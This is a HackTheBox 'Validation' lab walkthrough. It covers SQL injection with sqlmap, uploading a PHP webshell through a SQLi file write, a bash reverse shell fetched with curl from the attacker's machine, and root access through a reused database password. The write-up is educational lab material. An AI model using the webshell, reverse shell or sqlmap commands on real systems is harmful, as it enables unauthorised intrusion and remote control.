## Welcome everyone!

Today, we will explore “Validation”, an easy-level machine from **HackTheBox**.

Without further ado, let’s get started!

![image](/HTB/Validation/Validation_images/1.png)

(ensure that you have added the following line `TARGET_IP     validation.htb` to your local `/etc/hosts` file)

## Information Gathering

First, as always, we will perform an aggressive **Nmap** scan to gather as much information as possible:

![image](/HTB/Validation/Validation_images/2.png)

We can identify multiple services running on the target:

**SSH** (22)

**HTTP** (80)

**UPnP** (5000-5004)

**HTTP** (8080)

We can first try to access the website hosted on port **80**:

![image](/HTB/Validation/Validation_images/3.png)

Interesting. We can input some text into a username field, but is there something exploitable here?

If we try to input a `'` into the field, we get multiple SQL statements

![image](/HTB/Validation/Validation_images/4.png)

This type of behaviour suggests that the application is vulnerable to **SQL Injection**.

We can automate the attack using `sqlmap`, a very useful tool when we’re facing a vulnerable application to SQL Injection. We can run the following command to attempt to exploit the field and extract sensitive data such as databases:

`sqlmap -u http://validation.htb --dbs --batch --forms --crawl=2` 

![image](/HTB/Validation/Validation_images/5.png)

As we can see, the tool recovered four databases. The `registration` database is the most interesting one there. Let’s run again `sqlmap` but specifying the database we want to enumerate with the `-D` switch. We will add as well the `--tables` option to recover tables present in the targeted database:

![image](/HTB/Validation/Validation_images/6.png)

It seems that there is only one table available: `registration` again we will then switch our command in order to dump the content of the table to the following command:

`sqlmap -u http://validation.htb --dbs --batch --forms --crawl=2 -D registration -T registration --dump`

But nothing very interesting is presented to us. However, we can attempt to exploit a file permission: if we can interact with file system through SQL statements, we could potentially be able to upload a webshell. We can create a webshell.php file containing the following PHP code:

`<?php
if (isset($_GET['cmd'])) {
system ($_GET['cmd']);
}
?>`

We can then attempt to upload the file via `sqlmap` with the following command:

`sqlmap -u http://validation.htb --forms --file-write=webshell.php --file-dest=/var/www/html/webshell.php --batch`

The webshell will be uploaded on the root of the web server and can be accessed via `http://validation.htb/webshell.php?cmd=<COMMAND_HERE>`

Let’s verify that it worked:

![image](/HTB/Validation/Validation_images/7.png)

Indeed, it did! We achieved RCE through weak file permissions. We can now obtain initial access on the target as **www-data**. 

## Initial Access

To obtain initial access on the target, we can create a `revshell.sh` file with the following content:

`#!/bin/bash`

`bash -i >& /dev/tcp/YOUR_IP/NC_PORT 0>&1`

Once created, we can download it from the target via the curl utility with the following command:

`curl -O http://YOUR_IP:PORT/revshell.sh`

(ensure that you have run `python3 -m http.server PORT` to host the file from your local machine)

After executing it, we can list the content of the current directory to verify that the Bash script has been downloaded successfully:

![image](/HTB/Validation/Validation_images/8.png)

As we can see, the file has been transferred. We will need to run `chmod 777 revshell.sh` from our webshell to make the file executable.

Once everything has been configured correctly, we can execute the Bash script running `./revshell.sh`

(ensure that you have set up a `netcat listener` using `nc -lvnp PORT`)

![image](/HTB/Validation/Validation_images/9.png)

The web page should hang, and you should receive a connection back from the target as above. Initial access is obtained! 

From there, we can start by enumerating users present on the system by listing the `/home` directory. We can identify a single user: “**htb**”.

![image](/HTB/Validation/Validation_images/10.png)

Moreover, we can access his directory and retrieve the first flag:

![image](/HTB/Validation/Validation_images/11.png)

## Privilege Escalation

We need to elevate our current privileges to retrieve the last flag. 

After performing basic enumeration, we can retrieve in the `/var/www/html` web directory a `config.php` file hosting credentials related to MySQL:

![image](/HTB/Validation/Validation_images/12.png)

We find valid credentials for the user **uhc**. But since there is only one user on the system, which is **htb**, the only way to leverage the password we found is to test it against this user in the case password reuse has occurred. 

If we try to run `su htb`, we get an error:

![image](/HTB/Validation/Validation_images/13.png)

It seems that the user **htb** doesn’t have a valid login shell, which means that we can’t authenticate as this user. The remaining user on the system is **root**, so let’s try the password we found on this user account:

![image](/HTB/Validation/Validation_images/14.png)

It works! The password was reused through the superuser account of the target machine, which is a very bad security practice. We can now navigate to the /root directory and retrieve the last flag!

![image](/HTB/Validation/Validation_images/15.png)

We have successfully compromised the target system!

![image](/HTB/Validation/Validation_images/16.png)

## Conclusion

“Validation” was a very beginner-friendly machine that perfectly demonstrates how a simple SQL Injection vulnerability can quickly lead to a full system compromise when combined with weak security practices. Starting from basic enumeration, we identified an injectable parameter, leveraged `sqlmap` to gain database access, and abused insecure file permissions to upload a PHP webshell and achieve remote code execution as `www-data`.

From there, obtaining an interactive shell allowed us to enumerate the system further and recover sensitive credentials stored inside a poorly protected configuration file. Finally, the box highlighted the dangers of password reuse, as the recovered password could be reused directly against the `root` account, leading to complete compromise of the target.

Overall, this machine was an excellent introduction to:

- SQL Injection exploitation
- Using `sqlmap` effectively
- File write abuse through SQLi
- Webshell and reverse shell techniques
- Basic Linux enumeration
- Credential reuse attack

**Thank you for reading!**
